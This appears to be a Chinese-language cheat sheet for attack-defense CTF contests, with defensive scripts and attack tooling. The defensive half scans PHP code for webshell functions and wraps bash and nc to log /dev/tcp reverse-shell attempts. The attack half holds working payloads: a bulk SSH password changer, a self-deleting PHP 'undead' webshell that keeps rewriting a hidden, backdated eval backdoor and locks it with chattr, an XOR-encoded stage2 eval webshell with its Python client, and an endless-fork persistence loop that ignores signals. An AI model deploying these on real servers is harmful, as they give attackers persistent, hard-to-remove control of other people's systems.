# 防御
	- 打包带走当前文件夹
		- ```shell
		  dirname=$(basename "$(pwd)")
		  cd ..
		  tar -czvf "/tmp/$dirname.tar.gz" "$dirname"
		  ```
	- 查找危险函数
		- ```shell
		  grep -R -P '(eval|unser|shell|exec|system|move_uploaded_file)\(' ./* | grep -v .js| grep .php | grep -v hunlv | grep -P '(eval|unser|shell|exec|system|move_uploaded_file)\('
		  ```
	- 查找危险函数，加强版
		- ```shell
		  if ! [ -s $1 ]; then
		      echo "File $1 don't exists!"
		      exit 1
		  fi
		  var_regexp='@?\$(\[\s*|\s*\]|\{\s*|\s*\}|\$|@|[A-Za-z0-9._])+'
		  comment_regexp='(\s|/\*.*?\*/)*'
		  string_regexp="('[^']+'"'|"[^"]+")'
		  find "$1" -name '*.php' | xargs -I {} grep -EH --color=always \
		  "(eval|system|array_map|exec|shell_exec|wofeiwo|system|shell|\
		  webshell|assert|create_function|preg_replace|popen|pcntl_exec|ngel|\
		  reDuh|passthru|php_nst|phpspy|proc_open|call_user_func(_array)?|unserialize|\
		  ReflectionClass|ReflectionFunction|newInstanceArgs)\(|\
		  ${comment_regexp}${var_regexp}${comment_regexp}\(${comment_regexp}.*${comment_regexp}\)|\
		  ${string_regexp}\\^${string_regexp}|\
		  \((${string_regexp}\.?)*${string_regexp}\)\(${comment_regexp}.*${comment_regexp}\)" {}
		  
		  ```
	- 查找危险函数，php版
		- ```php
		  <?php
		  
		  function scanFiles($folder, $file_regexp)
		  {
		      $result = [];
		      $files = glob($folder . '/*');
		      foreach ($files as $file) {
		          if (is_file($file) && preg_match($file_regexp, $file)) {
		              array_push($result, $file);
		          } elseif (is_dir($file)) {
		              $result = array_merge($result, scanFiles($file,  $file_regexp));
		          }
		      }
		      return $result;
		  }
		  
		  $var_regexp = '@?\$(\[\s*|\s*\]|\{\s*|\s*\}|\$|@|[A-Za-z0-9._])+';
		  $comment_regexp = '(\s|\/\*.*?\*\/)*';
		  $string_regexp = "('[^']+'" . '|"[^"]+")';
		  
		  $regexp = "/(eval|system|array_map|exec|shell_exec|wofeiwo|system|shell|" .
		      "webshell|assert|create_function|preg_replace|popen|pcntl_exec|ngel|" .
		      "reDuh|passthru|php_nst|phpspy|proc_open|call_user_func(_array)?|unserialize|" .
		      "ReflectionClass|ReflectionFunction|newInstanceArgs)\\(" .
		      "|{$comment_regexp}{$var_regexp}{$comment_regexp}\({$comment_regexp}.*{$comment_regexp}\)" . # $aaa(xxx);
		      "|{$string_regexp}\^{$string_regexp}" . # string xor
		      "|\\(({$string_regexp}\\.?)*{$string_regexp}\\)\\({$comment_regexp}.*{$comment_regexp}\\)" . # ("sys"."tem")(xxx)
		      "/";
		  
		  // $pwd = $_SERVER['DOCUMENT_ROOT'];
		  foreach (scanFiles($_SERVER['DOCUMENT_ROOT'], "/php|php\d|phtm|phtml|phar/") as $filepath) {
		      if (preg_match_all($regexp, file_get_contents($filepath), $matches)) {
		          $detected = "";
		          foreach ($matches[0] as $match) {
		              $detected = "    " . trim($match);
		          }
		          echo $filepath . "\n" . $detected . "\n";
		      }
		  }
		  
		  ```
	- 修改MySQL密码
		- ```sql
		  set password for mycms@localhost = password('123');
		  ```
	- 防止攻击方使用bash和nc实现反弹shell
		- ```shell
		  mv $(which nc) /etc/
		  mv $(which bash) /etc/ && echo -e '#!/etc/bash\n/etc/bash "$@"' > /usr/bin/bash && chmod a+x /usr/bin/bash
		  touch /tmp/hunlv-reverse-bash.txt
		  chmod a+rwx /tmp/hunlv-reverse-bash.txt
		  cat > /usr/bin/bash << 'EOF'
		  #!/etc/bash
		  reverse_bash_msg=$(echo "$@" | grep '/dev/tcp/')
		  if [ "$reverse_bash_msg" != "" ]; then
		     echo "$reverse_bash_msg" >> /tmp/hunlv-reverse-bash.txt
		     echo "$reverse_bash_msg"
		     exit
		  fi
		  /etc/bash "$@"
		  EOF
		  ```
	- fakebin
		- ```shell
		  mkdir /tmp/fakebin
		  cat > /tmp/fakebin/whoami << EOF
		  #!/bin/sh
		  echo root
		  EOF
		  
		  cat > /tmp/fakebin/id << EOF
		  #!/bin/sh
		  echo 'uid=0(root) gid=0(root)'
		  EOF
		  
		  cat > /tmp/fakebin/bash << 'EOF'
		  #!/bin/sh
		  reverse_bash_msg=$(echo "$@" | /bin/grep '/dev/tcp/')
		  if [ "$reverse_bash_msg" != "" ]; then
		     echo "$reverse_bash_msg" >> /tmp/hunlv-reverse-bash.txt
		     exit
		  fi
		  EOF
		  
		  for filename in nc sh python python3 php grep cat tac curl wget; do
		      cat > /tmp/fakebin/$filename << EOF
		  #!/bin/sh
		  echo 'successfully executed, for real'
		  EOF
		  done
		  chmod 755 /tmp/fakebin/*
		  ```
- # 攻击
	- 批量修改SSH密码
		- ```shell
		  #!/bin/bash
		  
		  # 定义服务器列表
		  # servers=$(echo $(for i in $(seq 1 10); do echo "10.1.$i.1"; done) )
		  servers=("server1" "server2" "server3")
		  
		  # 定义SSH密码
		  new_password="newpassword114514"
		  
		  # 遍历服务器列表
		  for server in ${servers[@]}
		  do
		      # 进行登录并修改密码
		      sshpass -p "old_password" ssh user@$server "echo -e 'old_password\n$new_password\n$new_password' | passwd"
		      # 输出结果
		      if [ $? -eq 0 ]; then
		          echo "服务器 $server 密码修改成功"
		      else
		          echo "服务器 $server 密码修改失败"
		      fi
		  done
		  ```
- # PHP不死马
	- 密码`zombiehere`
	- ```php
	  <?php
	  ignore_user_abort(true);
	  set_time_limit(0);
	  unlink(__FILE__);
	  $file = '.zombie.php';
	  $code = '<?php if(md5($_GET["pass"])==="d939d9e4a66080b7546850656aa7c5ee"){@eval($_POST[a]);} ?>';
	  
	  function deleteFolder($folder) {
	      $files = glob($folder . '/*');
	      foreach ($files as $file) {
	          if (is_file($file)) {
	              unlink($file);
	          } elseif (is_dir($file)) {
	              deleteFolder($file);
	          }
	      }
	      rmdir($folder);
	  }
	  
	  while (1) {
	      if (is_dir($file)) {
	          deleteFolder($file);
	      }
	      file_put_contents($file, $code);
	      system('touch -m -d "2023-10-01 09:10:12" ' . $file);
	      system('chattr +i ' . $file);
	      usleep(5000);
	  }
	  ?>
	  ```
	- stage2马
		- php部分
			- ```php
			  <?php
			  session_start();
			  
			  if($_GET["action"] == "get") {
			      $_SESSION["k"] = random_int(10, 128);
			      echo "KEY: " . $_SESSION["k"] . ";";
			  }else if(!$_SESSION["k"]) {
			      echo "flag{3b6429dc-de5c-4c4e-ace5-7f52d2b79385}";
			  }else{
			      $data = base64_decode($_POST["data"]);
			      $arr = [];
			      $k = $_SESSION["k"];
			      for($i = 0; $i < strlen($data); $i ++) {
			          $arr[$i] = chr(ord($data[$i]) ^ $k);
			          $k = ($k + 1) % 256;
			      }
			      eval(implode("", $arr));
			  }
			  ```
		- python
			- ```python
			  def exp_stage2(url, payload):
			      r = base_get(url, params={"action": "get"})
			      if not r:
			          return 500, ""
			      key = re.search(r"KEY: (\d+);", r.text)
			      if not key:
			          print(r.text)
			          return 500, "No key"
			      key = int(key.group(1))
			  
			      def encode(s):
			          s = s.encode()
			          s = (b ^ ((key + i) % 256) for i, b in enumerate(s))
			          return encoder.base64_encode(bytes(s))
			  
			      r = base_post(
			          url,
			          data={"data": encode(payload)},
			          do_retry=False
			      )
			      if not r:
			          return 500, ""
			      return r.status_code, r.text
			  
			  session = postexec.session.PHPWebshellExp(exp_stage2, "http://127.0.0.1/stage2.php")
			  
			  ```
- # 无限fork权限维持
	- ```python
	  import os
	  import time
	  import signal
	  # made with love by marven11
	  is_dev = len("/bin") < 10
	  
	  if not is_dev:
	      os.unlink(__file__)
	  else:
	      print(__file__)
	  
	  
	  def hook_signals():
	  
	      def signal_handler(sig, frame):
	          pass
	  
	      signal.signal(signal.SIGINT, signal_handler)
	      signal.signal(signal.SIGHUP, signal_handler)
	  
	  
	  def loop():
	      print("do your evil things here")
	      # os.system("cat /flag")
	  
	  
	  def main():
	      last_exec_time = time.perf_counter()
	      hook_signals()
	      while True:
	          if is_dev:
	              time.sleep(0.1)
	          else:
	              time.sleep(0)
	          pid = os.fork()
	          if pid != 0:
	              exit()
	          if time.perf_counter() - last_exec_time > 1:
	              last_exec_time = time.perf_counter()
	              pid = os.fork()
	              if pid == 0:
	                  loop()
	                  exit()
	  
	  
	  if __name__ == "__main__":
	      main()
	  
	  ```